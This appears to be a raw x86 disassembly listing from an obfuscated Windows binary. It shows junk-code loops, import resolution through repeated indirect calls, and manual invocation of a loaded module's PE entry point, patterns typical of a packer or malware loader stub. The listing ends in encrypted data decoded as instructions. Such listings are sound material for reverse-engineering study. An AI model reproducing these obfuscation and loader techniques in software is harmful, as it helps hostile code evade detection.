  41eaa2:	mov    DWORD PTR ds:0x428e9d,0x14
  41eaac:	cmp    DWORD PTR ds:0x428e9d,0x0
  41eab3:	je     0x41eb02
  41eab9:	cmp    DWORD PTR ds:0x428e9d,0x3
  41eac0:	jb     0x41eb02
  41eac6:	jmp    0x41ead4
  41eacb:	push   DWORD PTR [ebp-0x18]
  41eace:	call   DWORD PTR ds:0x42ca2c
  41ead4:	cmp    DWORD PTR ds:0x428e9d,0x4
  41eadb:	jne    0x41eaee
  41eae1:	mov    ecx,DWORD PTR ds:0x428e9d
  41eae7:	dec    ecx
  41eae8:	mov    DWORD PTR ds:0x428e9d,ecx
  41eaee:	xor    ecx,ecx
  41eaf0:	add    ecx,DWORD PTR ds:0x428e9d
  41eaf6:	dec    ecx
  41eaf7:	mov    DWORD PTR ds:0x428e9d,ecx
  41eafd:	jmp    0x41eaac
  41eb02:	mov    ds:0x4281e9,eax
  41eb07:	sbb    eax,eax
  41eb09:	mov    eax,DWORD PTR [ebp+0x10]
  41eb0c:	mov    ds:0x428445,eax
  41eb11:	mov    eax,ds:0x4281e9
  41eb16:	mov    ecx,DWORD PTR [esp+0x30]
  41eb1a:	dec    DWORD PTR ds:0x428e99
  41eb20:	sub    eax,ebx
  41eb22:	xor    eax,esi
  41eb24:	mov    DWORD PTR ds:0x428e99,0x6c0e
  41eb2e:	mov    DWORD PTR [ecx],eax
  41eb30:	lea    eax,[esp+0x24]
  41eb34:	mov    DWORD PTR ds:0x428ea5,0x17d
  41eb3e:	mov    DWORD PTR [esp+0x44],eax
  41eb42:	lea    eax,[ebp+0x4]
  41eb45:	mov    DWORD PTR ds:0x428ec5,0x4441
  41eb4f:	mov    DWORD PTR [esp+0x24],eax
  41eb53:	mov    al,ds:0x42857e
  41eb58:	mov    DWORD PTR ds:0x428e49,0x46bb
  41eb62:	cmp    al,BYTE PTR ds:0x42858b
  41eb68:	jne    0x41e428
  41eb6e:	mov    al,ds:0x428597
  41eb73:	mov    DWORD PTR ds:0x428eb1,0x61de
  41eb7d:	cmp    al,BYTE PTR ds:0x4285a8
  41eb83:	mov    DWORD PTR ds:0x428e71,0x1a2b
  41eb8d:	jne    0x41e428
  41eb93:	push   0x4285b1
  41eb98:	sbb    DWORD PTR ds:0x428e8d,0x428e79
  41eba2:	push   0x4285bd
  41eba7:	sbb    DWORD PTR ds:0x428e75,0x428e6d
  41ebb1:	call   edi
  41ebb3:	or     DWORD PTR ds:0x428e9d,0x2f2b
  41ebbd:	test   eax,eax
  41ebbf:	je     0x41e428
  41ebc5:	mov    DWORD PTR ds:0x428ec5,0x7907
  41ebcf:	mov    al,ds:0x4285ce
  41ebd4:	cmp    al,BYTE PTR ds:0x4285db
  41ebda:	mov    DWORD PTR ds:0x428e5d,0x5f7d
  41ebe4:	jne    0x41e428
  41ebea:	mov    DWORD PTR ds:0x428e3d,0x1797
  41ebf4:	mov    al,ds:0x4285e7
  41ebf9:	cmp    al,BYTE PTR ds:0x4285f8
  41ebff:	jne    0x41e428
  41ec05:	add    DWORD PTR ds:0x428ec1,0x428ead
  41ec0f:	push   0x428601
  41ec14:	push   0x42860d
  41ec19:	call   edi
  41ec1b:	test   eax,eax
  41ec1d:	mov    DWORD PTR ds:0x428e69,0x333a
  41ec27:	je     0x41e428
  41ec2d:	mov    al,ds:0x42861e
  41ec32:	cmp    al,BYTE PTR ds:0x42862b
  41ec38:	mov    DWORD PTR ds:0x428e65,0x2ea7
  41ec42:	jne    0x41e428
  41ec48:	mov    DWORD PTR ds:0x428e85,0x19a
  41ec52:	mov    al,ds:0x428637
  41ec57:	mov    DWORD PTR ds:0x428ec5,0xb46
  41ec61:	cmp    al,BYTE PTR ds:0x428648
  41ec67:	mov    DWORD PTR ds:0x428e91,0x2cce
  41ec71:	jne    0x41e428
  41ec77:	push   0x428651
  41ec7c:	add    DWORD PTR ds:0x428eb1,0x428ea5
  41ec86:	push   0x42865d
  41ec8b:	call   edi
  41ec8d:	test   eax,eax
  41ec8f:	mov    DWORD PTR ds:0x428e7d,0x28e1
  41ec99:	je     0x41e428
  41ec9f:	mov    al,ds:0x42866e
  41eca4:	mov    DWORD PTR ds:0x428e35,0x7fda
  41ecae:	cmp    al,BYTE PTR ds:0x42867b
  41ecb4:	mov    DWORD PTR ds:0x428eb5,0x205
  41ecbe:	jne    0x41e428
  41ecc4:	mov    DWORD PTR ds:0x428ea9,0x1bc1
  41ecce:	mov    al,ds:0x428687
  41ecd3:	mov    DWORD PTR ds:0x428e31,0xcbc
  41ecdd:	cmp    al,BYTE PTR ds:0x428698
  41ece3:	jne    0x41e428
  41ece9:	xor    DWORD PTR ds:0x428e75,0x428e55
  41ecf3:	push   0x4286a1
  41ecf8:	push   0x4286ad
  41ecfd:	call   edi
  41ecff:	or     DWORD PTR ds:0x428eb9,0x1b73
  41ed09:	test   eax,eax
  41ed0b:	je     0x41e428
  41ed11:	mov    al,ds:0x4286be
  41ed16:	mov    DWORD PTR ds:0x428ebd,0x533
  41ed20:	cmp    al,BYTE PTR ds:0x4286cb
  41ed26:	mov    DWORD PTR ds:0x428eb1,0x6a19
  41ed30:	jne    0x41e428
  41ed36:	mov    DWORD PTR ds:0x428e79,0x3b4e
  41ed40:	mov    al,ds:0x4286d7
  41ed45:	mov    DWORD PTR ds:0x428e79,0x665f
  41ed4f:	cmp    al,BYTE PTR ds:0x4286e8
  41ed55:	jne    0x41e428
  41ed5b:	xor    DWORD PTR ds:0x428ead,0x43e0
  41ed65:	push   0x4286f1
  41ed6a:	push   0x4286fd
  41ed6f:	add    DWORD PTR ds:0x428eb1,0x428e79
  41ed79:	call   edi
  41ed7b:	and    DWORD PTR ds:0x428e7d,0x428e25
  41ed85:	test   eax,eax
  41ed87:	je     0x41e428
  41ed8d:	mov    al,ds:0x42870e
  41ed92:	mov    DWORD PTR ds:0x428e59,0x5b53
  41ed9c:	cmp    al,BYTE PTR ds:0x42871b
  41eda2:	jne    0x41e428
  41eda8:	mov    DWORD PTR ds:0x428e25,0x5848
  41edb2:	mov    al,ds:0x428727
  41edb7:	mov    DWORD PTR ds:0x428e75,0x6f79
  41edc1:	cmp    al,BYTE PTR ds:0x428738
  41edc7:	jne    0x41e428
  41edcd:	push   0x428741
  41edd2:	push   0x42874d
  41edd7:	call   edi
  41edd9:	sub    DWORD PTR ds:0x428e75,0x1f6e
  41ede3:	test   eax,eax
  41ede5:	je     0x41e428
  41edeb:	mov    al,ds:0x42875e
  41edf0:	mov    DWORD PTR ds:0x428ea9,0x6a75
  41edfa:	cmp    al,BYTE PTR ds:0x42876b
  41ee00:	mov    DWORD PTR ds:0x428e95,0x5296
  41ee0a:	jne    0x41e428
  41ee10:	mov    DWORD PTR ds:0x428e65,0x352f
  41ee1a:	mov    al,ds:0x428777
  41ee1f:	cmp    al,BYTE PTR ds:0x428788
  41ee25:	mov    DWORD PTR ds:0x428e39,0x65de
  41ee2f:	jne    0x41e428
  41ee35:	add    DWORD PTR ds:0x428ec5,0x39e0
  41ee3f:	push   0x428791
  41ee44:	sbb    DWORD PTR ds:0x428ec5,0x70eb
  41ee4e:	push   0x42879d
  41ee53:	add    DWORD PTR ds:0x428e75,0x6377
  41ee5d:	call   edi
  41ee5f:	test   eax,eax
  41ee61:	je     0x41e428
  41ee67:	mov    al,ds:0x4287ae
  41ee6c:	cmp    al,BYTE PTR ds:0x4287bb
  41ee72:	mov    DWORD PTR ds:0x428e75,0xc68
  41ee7c:	jne    0x41e428
  41ee82:	mov    DWORD PTR ds:0x428ea9,0x47d0
  41ee8c:	mov    al,ds:0x4287c7
  41ee91:	mov    DWORD PTR ds:0x428e35,0x2f08
  41ee9b:	cmp    al,BYTE PTR ds:0x4287d8
  41eea1:	mov    DWORD PTR ds:0x428e31,0x4709
  41eeab:	jne    0x41e428
  41eeb1:	sbb    DWORD PTR ds:0x428eb1,0x2bd9
  41eebb:	push   0x4287e1
  41eec0:	or     DWORD PTR ds:0x428e79,0x428ead
  41eeca:	push   0x4287ed
  41eecf:	adc    DWORD PTR ds:0x428ea1,0x22ee
  41eed9:	call   edi
  41eedb:	adc    DWORD PTR ds:0x428ecd,0x428ec5
  41eee5:	test   eax,eax
  41eee7:	mov    DWORD PTR ds:0x428e79,0x242c
  41eef1:	je     0x41e428
  41eef7:	mov    DWORD PTR ds:0x428e3d,0x326f
  41ef01:	mov    al,ds:0x4287fe
  41ef06:	mov    DWORD PTR ds:0x428eb9,0x8d5
  41ef10:	cmp    al,BYTE PTR ds:0x42880b
  41ef16:	mov    DWORD PTR ds:0x428e59,0x136
  41ef20:	jne    0x41e428
  41ef26:	mov    al,ds:0x428817
  41ef2b:	mov    DWORD PTR ds:0x428eb1,0x1632
  41ef35:	cmp    al,BYTE PTR ds:0x428828
  41ef3b:	mov    DWORD PTR ds:0x428e65,0x63ac
  41ef45:	jne    0x41e428
  41ef4b:	sub    DWORD PTR ds:0x428e59,0x428e31
  41ef55:	push   0x428831
  41ef5a:	push   0x42883d
  41ef5f:	mov    DWORD PTR ds:0x428e25,0x5d60
  41ef69:	call   edi
  41ef6b:	test   eax,eax
  41ef6d:	je     0x41e428
  41ef73:	mov    al,ds:0x42884e
  41ef78:	mov    DWORD PTR ds:0x428eb5,0x1dcb
  41ef82:	cmp    al,BYTE PTR ds:0x42885b
  41ef88:	mov    DWORD PTR ds:0x428eb5,0x40d0
  41ef92:	jne    0x41e428
  41ef98:	mov    al,ds:0x428867
  41ef9d:	mov    DWORD PTR ds:0x428ead,0x41e1
  41efa7:	cmp    al,BYTE PTR ds:0x428878
  41efad:	mov    DWORD PTR ds:0x428e31,0x6c07
  41efb7:	jne    0x41e428
  41efbd:	adc    DWORD PTR ds:0x428ea5,0x428ec9
  41efc7:	push   0x428881
  41efcc:	adc    DWORD PTR ds:0x428eb5,0x37c3
  41efd6:	push   0x42888d
  41efdb:	call   edi
  41efdd:	sub    DWORD PTR ds:0x428e31,0x47c0
  41efe7:	test   eax,eax
  41efe9:	mov    DWORD PTR ds:0x428e91,0x23ba
  41eff3:	je     0x41e428
  41eff9:	mov    DWORD PTR ds:0x428ea5,0x1cf7
  41f003:	mov    al,ds:0x42889e
  41f008:	mov    DWORD PTR ds:0x428e25,0x6ea3
  41f012:	cmp    al,BYTE PTR ds:0x4288ab
  41f018:	jne    0x41e428
  41f01e:	mov    DWORD PTR ds:0x428e95,0x9ed
  41f028:	mov    al,ds:0x4288b7
  41f02d:	mov    DWORD PTR ds:0x428e75,0x600
  41f037:	cmp    al,BYTE PTR ds:0x4288c8
  41f03d:	mov    DWORD PTR ds:0x428ead,0x4d3e
  41f047:	jne    0x41e428
  41f04d:	push   0x4288d1
  41f052:	push   0x4288dd
  41f057:	sbb    DWORD PTR ds:0x428ebd,0x717e
  41f061:	call   edi
  41f063:	sub    DWORD PTR ds:0x428e79,0x428e69
  41f06d:	test   eax,eax
  41f06f:	je     0x41e428
  41f075:	mov    al,ds:0x4288ee
  41f07a:	cmp    al,BYTE PTR ds:0x4288fb
  41f080:	jne    0x41e428
  41f086:	mov    al,ds:0x428907
  41f08b:	cmp    al,BYTE PTR ds:0x428918
  41f091:	jne    0x41e428
  41f097:	push   0x428921
  41f09c:	push   0x42892d
  41f0a1:	call   edi
  41f0a3:	test   eax,eax
  41f0a5:	je     0x41e428
  41f0ab:	mov    al,ds:0x42893e
  41f0b0:	cmp    al,BYTE PTR ds:0x42894b
  41f0b6:	jne    0x41e428
  41f0bc:	mov    al,ds:0x428957
  41f0c1:	cmp    al,BYTE PTR ds:0x428968
  41f0c7:	jne    0x41e428
  41f0cd:	push   0x428971
  41f0d2:	push   0x42897d
  41f0d7:	call   edi
  41f0d9:	test   eax,eax
  41f0db:	je     0x41e428
  41f0e1:	mov    al,ds:0x42898e
  41f0e6:	cmp    al,BYTE PTR ds:0x42899b
  41f0ec:	jne    0x41e428
  41f0f2:	mov    al,ds:0x4289a7
  41f0f7:	cmp    al,BYTE PTR ds:0x4289b8
  41f0fd:	jne    0x41e428
  41f103:	push   0x4289c1
  41f108:	push   0x4289cd
  41f10d:	call   edi
  41f10f:	test   eax,eax
  41f111:	je     0x41e428
  41f117:	mov    al,ds:0x4289de
  41f11c:	cmp    al,BYTE PTR ds:0x4289eb
  41f122:	jne    0x41e428
  41f128:	mov    al,ds:0x4289f7
  41f12d:	cmp    al,BYTE PTR ds:0x428a08
  41f133:	jne    0x41e428
  41f139:	push   0x428a11
  41f13e:	push   0x428a1d
  41f143:	call   edi
  41f145:	test   eax,eax
  41f147:	je     0x41e428
  41f14d:	mov    al,ds:0x428a2e
  41f152:	cmp    al,BYTE PTR ds:0x428a3b
  41f158:	jne    0x41e428
  41f15e:	mov    al,ds:0x428a47
  41f163:	cmp    al,BYTE PTR ds:0x428a58
  41f169:	jne    0x41e428
  41f16f:	push   0x428a61
  41f174:	push   0x428a6d
  41f179:	call   edi
  41f17b:	test   eax,eax
  41f17d:	je     0x41e428
  41f183:	mov    al,ds:0x428a7e
  41f188:	cmp    al,BYTE PTR ds:0x428a8b
  41f18e:	jne    0x41e428
  41f194:	mov    al,ds:0x428a97
  41f199:	cmp    al,BYTE PTR ds:0x428aa8
  41f19f:	jne    0x41e428
  41f1a5:	push   0x428ab1
  41f1aa:	push   0x428abd
  41f1af:	call   edi
  41f1b1:	test   eax,eax
  41f1b3:	je     0x41e428
  41f1b9:	mov    al,ds:0x428ace
  41f1be:	cmp    al,BYTE PTR ds:0x428adb
  41f1c4:	jne    0x41e428
  41f1ca:	mov    al,ds:0x428ae7
  41f1cf:	cmp    al,BYTE PTR ds:0x428af8
  41f1d5:	jne    0x41e428
  41f1db:	push   0x428b01
  41f1e0:	push   0x428b0d
  41f1e5:	call   edi
  41f1e7:	test   eax,eax
  41f1e9:	je     0x41e428
  41f1ef:	mov    al,ds:0x428b1e
  41f1f4:	cmp    al,BYTE PTR ds:0x428b2b
  41f1fa:	jne    0x41e428
  41f200:	mov    al,ds:0x428b37
  41f205:	cmp    al,BYTE PTR ds:0x428b48
  41f20b:	jne    0x41e428
  41f211:	push   0x428b51
  41f216:	push   0x428b5d
  41f21b:	call   edi
  41f21d:	test   eax,eax
  41f21f:	je     0x41e428
  41f225:	mov    al,ds:0x428b6e
  41f22a:	cmp    al,BYTE PTR ds:0x428b7b
  41f230:	jne    0x41e428
  41f236:	mov    al,ds:0x428b87
  41f23b:	cmp    al,BYTE PTR ds:0x428b98
  41f241:	jne    0x41e428
  41f247:	push   0x428ba1
  41f24c:	push   0x428bad
  41f251:	call   edi
  41f253:	test   eax,eax
  41f255:	je     0x41e428
  41f25b:	mov    al,ds:0x428bbe
  41f260:	cmp    al,BYTE PTR ds:0x428bcb
  41f266:	jne    0x41e428
  41f26c:	mov    al,ds:0x428bd7
  41f271:	cmp    al,BYTE PTR ds:0x428be8
  41f277:	jne    0x41e428
  41f27d:	push   0x428bf1
  41f282:	push   0x428bfd
  41f287:	call   edi
  41f289:	test   eax,eax
  41f28b:	je     0x41e428
  41f291:	mov    eax,DWORD PTR [esp+0x3c]
  41f295:	cmp    eax,0xf89c85b8
  41f29a:	je     0x41f2f9
  41f2a0:	mov    eax,DWORD PTR [esp+0x28]
  41f2a4:	mov    ecx,DWORD PTR [esp+0x38]
  41f2a8:	xor    eax,esi
  41f2aa:	add    eax,ebx
  41f2ac:	cmp    eax,ecx
  41f2ae:	je     0x41f2f9
  41f2b4:	mov    eax,ds:0x428365
  41f2b9:	mov    eax,DWORD PTR [eax+0x194]
  41f2bf:	mov    ecx,DWORD PTR [eax]
  41f2c1:	mov    eax,DWORD PTR [ecx+0x3c]
  41f2c4:	push   DWORD PTR ds:0x428445
  41f2ca:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41f2ce:	push   DWORD PTR ds:0x4281e9
  41f2d4:	add    eax,ecx
  41f2d6:	mov    ecx,DWORD PTR ds:0x428365
  41f2dc:	mov    ecx,DWORD PTR [ecx+0x194]
  41f2e2:	push   DWORD PTR [ecx]
  41f2e4:	call   eax
  41f2e6:	mov    ecx,DWORD PTR ds:0x428365
  41f2ec:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41f2f2:	mov    DWORD PTR [ecx],eax
  41f2f4:	jmp    0x41f4f3
  41f2f9:	mov    eax,DWORD PTR [esp+0x28]
  41f2fd:	mov    ecx,DWORD PTR [esp+0x40]
  41f301:	xor    eax,esi
  41f303:	add    eax,ebx
  41f305:	cmp    eax,ecx
  41f307:	jne    0x41f372
  41f30d:	mov    eax,DWORD PTR [esp+0x28]
  41f311:	mov    ecx,DWORD PTR ds:0x428365
  41f317:	mov    ecx,DWORD PTR [ecx+0x198]
  41f31d:	xor    eax,esi
  41f31f:	add    eax,ebx
  41f321:	cmp    eax,DWORD PTR [ecx]
  41f323:	jne    0x41f34b
  41f329:	mov    eax,DWORD PTR [esp+0x28]
  41f32d:	push   0xffffffff
  41f32f:	push   0x70941f8a
  41f334:	xor    eax,esi
  41f336:	add    eax,ebx
  41f338:	push   eax
  41f339:	push   0xf89c85bd
  41f33e:	push   DWORD PTR [esp+0x1c]
  41f342:	push   DWORD PTR [esp+0x3c]
  41f346:	call   0x417181
  41f34b:	push   DWORD PTR [esp+0xc]
  41f34f:	push   DWORD PTR [esp+0x2c]
  41f353:	call   0x401000
  41f358:	mov    eax,DWORD PTR [esp+0x28]
  41f35c:	xor    eax,esi
  41f35e:	add    eax,ebx
  41f360:	mov    ds:0x4283f1,eax
  41f365:	mov    eax,DWORD PTR [esp+0x28]
  41f369:	xor    eax,esi
  41f36b:	add    eax,ebx
  41f36d:	mov    ds:0x4283e9,eax
  41f372:	mov    eax,DWORD PTR [esp+0x24]
  41f376:	test   eax,eax
  41f378:	je     0x41f4f3
  41f37e:	mov    DWORD PTR [esp+0x4c],0xf152c20
  41f386:	mov    DWORD PTR [esp+0x54],0x712edcf
  41f38e:	mov    DWORD PTR [esp+0x48],0x373fc11
  41f396:	mov    DWORD PTR [esp+0x50],0x72670ac1
  41f39e:	call   0x414ac6
  41f3a3:	mov    eax,DWORD PTR [esp+0x34]
  41f3a7:	mov    eax,DWORD PTR [esp+0xc]
  41f3ab:	mov    DWORD PTR [esp+0x30],eax
  41f3af:	mov    eax,DWORD PTR [esp+0x28]
  41f3b3:	mov    DWORD PTR [esp+0xc],eax
  41f3b7:	mov    eax,eax
  41f3b9:	mov    eax,ds:0x428365
  41f3be:	mov    ecx,DWORD PTR [eax+0x1c0]
  41f3c4:	mov    edx,DWORD PTR [ecx]
  41f3c6:	and    DWORD PTR [esp+0x14],0x0
  41f3cb:	mov    edi,0xfabdbecf
  41f3d0:	add    edx,edi
  41f3d2:	adc    DWORD PTR [esp+0x14],0xffffffff
  41f3d7:	mov    ecx,0x8a29a145
  41f3dc:	xor    edx,ecx
  41f3de:	mov    DWORD PTR [esp+0x18],edx
  41f3e2:	mov    edx,DWORD PTR [esp+0x14]
  41f3e6:	xor    edx,0x0
  41f3e9:	cmp    DWORD PTR [esp+0x18],0x70941f95
  41f3f1:	mov    DWORD PTR [esp+0x1c],edx
  41f3f5:	jne    0x41f427
  41f3fb:	cmp    edx,0xffffffff
  41f3fe:	jne    0x41f427
  41f404:	mov    eax,ds:0x4283e9
  41f409:	mov    edx,DWORD PTR ds:0x4283f1
  41f40f:	xor    eax,edx
  41f411:	mov    ds:0x4283e9,eax
  41f416:	mov    edx,DWORD PTR ds:0x4283e9
  41f41c:	mov    eax,DWORD PTR [esp+0x24]
  41f420:	add    DWORD PTR [eax],edx
  41f422:	jmp    0x41f4b4
  41f427:	mov    eax,DWORD PTR [eax+0x1c8]
  41f42d:	mov    eax,DWORD PTR [eax]
  41f42f:	cdq    
  41f430:	add    eax,edi
  41f432:	adc    edx,0xffffffff
  41f435:	and    DWORD PTR [esp+0x14],0x0
  41f43a:	xor    edx,0x0
  41f43d:	mov    DWORD PTR [esp+0x2c],edx
  41f441:	mov    edx,DWORD PTR [esp+0xc]
  41f445:	mov    DWORD PTR [esp+0x10],edx
  41f449:	xor    eax,ecx
  41f44b:	add    DWORD PTR [esp+0x10],edi
  41f44f:	mov    edx,DWORD PTR [esp+0x10]
  41f453:	adc    DWORD PTR [esp+0x14],0xffffffff
  41f458:	xor    edx,ecx
  41f45a:	mov    DWORD PTR [esp+0x18],edx
  41f45e:	mov    edx,DWORD PTR [esp+0x14]
  41f462:	xor    edx,0x0
  41f465:	mov    DWORD PTR [esp+0x1c],edx
  41f469:	cmp    DWORD PTR [esp+0x18],eax
  41f46d:	jne    0x41f47f
  41f473:	mov    eax,DWORD PTR [esp+0x2c]
  41f477:	cmp    edx,eax
  41f479:	je     0x41f490
  41f47f:	mov    eax,DWORD PTR [esp+0xc]
  41f483:	add    eax,DWORD PTR [esp+0x30]
  41f487:	mov    DWORD PTR [esp+0xc],eax
  41f48b:	jmp    0x41f4f3
  41f490:	mov    eax,ds:0x4283e9
  41f495:	mov    edx,DWORD PTR ds:0x4283f1
  41f49b:	xor    eax,edx
  41f49d:	mov    ds:0x4283e9,eax
  41f4a2:	mov    eax,DWORD PTR [esp+0x24]
  41f4a6:	mov    edx,DWORD PTR ds:0x4283e9
  41f4ac:	add    edx,DWORD PTR [eax]
  41f4ae:	mov    eax,DWORD PTR [esp+0x24]
  41f4b2:	mov    DWORD PTR [eax],edx
  41f4b4:	mov    edx,DWORD PTR [esp+0xc]
  41f4b8:	mov    eax,ds:0x4283e9
  41f4bd:	xor    edx,esi
  41f4bf:	add    edx,ebx
  41f4c1:	xor    ebx,ebx
  41f4c3:	add    edx,edi
  41f4c5:	adc    ebx,0xffffffff
  41f4c8:	xor    esi,esi
  41f4ca:	xor    edx,ecx
  41f4cc:	xor    ebx,0x0
  41f4cf:	add    eax,edi
  41f4d1:	adc    esi,0xffffffff
  41f4d4:	xor    eax,ecx
  41f4d6:	xor    esi,0x0
  41f4d9:	cmp    eax,edx
  41f4db:	jne    0x41f4f3
  41f4e1:	cmp    esi,ebx
  41f4e3:	jne    0x41f4f3
  41f4e9:	mov    eax,ds:0x4283e9
  41f4ee:	mov    ds:0x4283f1,eax
  41f4f3:	mov    eax,ds:0x428365
  41f4f8:	push   0x4
  41f4fa:	add    eax,0x1cc
  41f4ff:	push   eax
  41f500:	lea    eax,[esp+0x3c]
  41f504:	push   eax
  41f505:	call   0x41f519
  41f50a:	mov    eax,DWORD PTR [esp+0x34]
  41f50e:	mov    eax,DWORD PTR [eax]
  41f510:	pop    edi
  41f511:	pop    esi
  41f512:	pop    ebx
  41f513:	mov    esp,ebp
  41f515:	pop    ebp
  41f516:	ret    0xc
  41f519:	push   ebp
  41f51a:	mov    ebp,esp
  41f51c:	sub    esp,0x10
  41f51f:	mov    DWORD PTR ds:0x428e69,0x19
  41f529:	cmp    DWORD PTR ds:0x428e69,0x0
  41f530:	je     0x41f565
  41f536:	cmp    DWORD PTR ds:0x428e69,0x1f
  41f53d:	jge    0x41f565
  41f543:	jmp    0x41f553
  41f548:	push   0x4280ab
  41f54d:	call   DWORD PTR ds:0x42ca30
  41f553:	mov    edx,DWORD PTR ds:0x428e69
  41f559:	dec    edx
  41f55a:	mov    DWORD PTR ds:0x428e69,edx
  41f560:	jmp    0x41f529
  41f565:	mov    eax,0xf89c85b9
  41f56a:	mov    DWORD PTR [ebp-0x4],eax
  41f56d:	or     ecx,edx
  41f56f:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41f576:	sbb    DWORD PTR ds:0x428e35,ecx
  41f57c:	mov    ecx,DWORD PTR [ebp-0x4]
  41f57f:	sbb    DWORD PTR ds:0x428e95,edi
  41f585:	push   esi
  41f586:	mov    edx,0x75108b1
  41f58b:	inc    DWORD PTR ds:0x428e49
  41f591:	xor    ecx,edx
  41f593:	sub    DWORD PTR ds:0x428ed1,edx
  41f599:	mov    esi,0x3272f8
  41f59e:	adc    DWORD PTR ds:0x428e41,0x428e31
  41f5a8:	push   edi
  41f5a9:	mov    edi,DWORD PTR [ebp+0x10]
  41f5ac:	xor    DWORD PTR ds:0x428e7d,0x428e91
  41f5b6:	add    ecx,esi
  41f5b8:	mov    DWORD PTR ds:0x428e59,0x285e
  41f5c2:	cmp    ecx,edi
  41f5c4:	je     0x423f13
  41f5ca:	and    DWORD PTR ds:0x428ec9,0x0
  41f5d4:	xor    ecx,ecx
  41f5d6:	add    ecx,DWORD PTR ds:0x428ec9
  41f5dc:	inc    ecx
  41f5dd:	mov    DWORD PTR ds:0x428ec9,ecx
  41f5e3:	cmp    DWORD PTR ds:0x428ec9,0x4
  41f5ea:	ja     0x41f629
  41f5f0:	jmp    0x41f600
  41f5f5:	push   0x5d76
  41f5fa:	call   DWORD PTR ds:0x42ca38
  41f600:	cmp    DWORD PTR ds:0x428ec9,0x3
  41f607:	jne    0x41f61c
  41f60d:	xor    ecx,ecx
  41f60f:	or     ecx,DWORD PTR ds:0x428ec9
  41f615:	inc    ecx
  41f616:	mov    DWORD PTR ds:0x428ec9,ecx
  41f61c:	cmp    DWORD PTR ds:0x428ec9,0x1c
  41f623:	jb     0x41f5d4
  41f629:	mov    ecx,DWORD PTR [ebp-0x4]
  41f62c:	xor    edi,edi
  41f62e:	xor    edi,DWORD PTR ds:0x428e39
  41f634:	or     DWORD PTR ds:0x428e25,edi
  41f63a:	mov    edi,DWORD PTR [ebp+0x10]
  41f63d:	and    DWORD PTR ds:0x428e55,0x428e29
  41f647:	xor    eax,eax
  41f649:	add    DWORD PTR ds:0x428e91,0x4be1
  41f653:	xor    ecx,edx
  41f655:	adc    DWORD PTR ds:0x428e81,0x428e69
  41f65f:	add    ecx,esi
  41f661:	add    edi,0xfabdbecf
  41f667:	adc    eax,0xffffffff
  41f66a:	and    DWORD PTR ds:0x428e39,0x428ec1
  41f674:	xor    eax,0x0
  41f677:	xor    DWORD PTR ds:0x428e75,0x428e29
  41f681:	mov    DWORD PTR [ebp-0xc],eax
  41f684:	push   ebx
  41f685:	xor    ebx,ebx
  41f687:	and    DWORD PTR ds:0x428ea1,0x0
  41f691:	jmp    0x41f6a4
  41f696:	xor    eax,eax
  41f698:	xor    eax,DWORD PTR ds:0x428ea1
  41f69e:	inc    eax
  41f69f:	mov    ds:0x428ea1,eax
  41f6a4:	cmp    DWORD PTR ds:0x428ea1,0x14
  41f6ab:	jae    0x41f6f4
  41f6b1:	cmp    DWORD PTR ds:0x428ea1,0xa
  41f6b8:	jle    0x41f6f4
  41f6be:	jmp    0x41f6d7
  41f6c3:	push   DWORD PTR [ebp-0x14]
  41f6c6:	push   DWORD PTR [ebp-0xc]
  41f6c9:	push   0x22e9
  41f6ce:	push   DWORD PTR [ebp-0x18]
  41f6d1:	call   DWORD PTR ds:0x42ca3c
  41f6d7:	cmp    DWORD PTR ds:0x428ea1,0x9
  41f6de:	jne    0x41f6ef
  41f6e4:	mov    eax,ds:0x428ea1
  41f6e9:	inc    eax
  41f6ea:	mov    ds:0x428ea1,eax
  41f6ef:	jmp    0x41f696
  41f6f4:	xor    edi,0x8a29a145
  41f6fa:	mov    eax,ecx
  41f6fc:	add    eax,0xfabdbecf
  41f701:	adc    ebx,0xffffffff
  41f704:	xor    eax,0x8a29a145
  41f709:	xor    ebx,0x0
  41f70c:	cmp    eax,edi
  41f70e:	jmp    0x421acd
  41f713:	pop    ebx
  41f714:	popf   
  41f715:	cwde   
  41f716:	jo     0x41f772
  41f718:	jp     0x41f77d
  41f71a:	mov    dl,0xe1
  41f71c:	cmp    eax,0x9b000de9
  41f721:	sbb    eax,0x7c24814f
  41f726:	jnp    0x41f745
  41f728:	sahf   
  41f729:	jnp    0x41f7a6
  41f72b:	push   0xb54e1248
  41f730:	lahf   
  41f731:	mov    cl,0xcc
  41f733:	lock push 0xffffffd3
  41f736:	xchg   esi,eax
  41f737:	addr16 xchg esi,eax
  41f739:	xchg   BYTE PTR [ecx],al
  41f73b:	push   edx
  41f73c:	out    0x20,eax
  41f73e:	adc    ebp,DWORD PTR es:[edx]
  41f741:	xlat   BYTE PTR ds:[ebx]
  41f742:	jns    0x41f7a2
  41f744:	int    0xe4
  41f746:	imul   edx,DWORD PTR [edx-0x40],0x79cf0022
  41f74d:	out    dx,eax
  41f74e:	aas    
  41f74f:	inc    ebp
  41f750:	loopne 0x41f751
  41f752:	pop    edx
  41f753:	fcom   st(2)
  41f755:	lods   al,BYTE PTR ds:[esi]
  41f756:	cmp    ch,dh
  41f758:	sbb    eax,0x685429d7
  41f75d:	xchg   esp,eax
  41f75e:	xchg   esp,eax
  41f75f:	pop    ebp
  41f760:	dec    edi
  41f761:	(bad)  
  41f762:	aam    0x5d
  41f764:	dec    ebx
  41f765:	cmp    al,0x29
  41f767:	ins    BYTE PTR es:[edi],dx
  41f768:	cld    
  41f769:	xor    cl,BYTE PTR [ecx]
  41f76b:	pop    edx
  41f76c:	or     eax,0x4ed1a4df
  41f771:	or     al,0x2f
  41f773:	pop    es
  41f774:	fimul  DWORD PTR [esp+ecx*2+0x29]
  41f778:	inc    esp
  41f779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f77a:	jmp    0x7dd3:0xd4875cf8
  41f781:	std    
  41f782:	inc    esp
  41f783:	add    dh,cl
  41f785:	nop
  41f786:	into   
  41f787:	xor    eax,0xa51c8c86
  41f78c:	jecxz  0x41f765
  41f78e:	dec    edi
  41f78f:	loopne 0x41f77a
  41f791:	mov    edx,0x8a5080b1
  41f796:	mov    ah,0x1c
  41f798:	dec    ebp
  41f799:	and    ebp,ebx
  41f79b:	repz jle 0x41f7ab
  41f79e:	stos   BYTE PTR es:[edi],al
  41f79f:	ficomp DWORD PTR [edi+0x69d748b5]
  41f7a5:	pop    ecx
  41f7a6:	sub    BYTE PTR [esi],dl
  41f7a8:	test   bl,dh
  41f7aa:	xchg   esi,eax
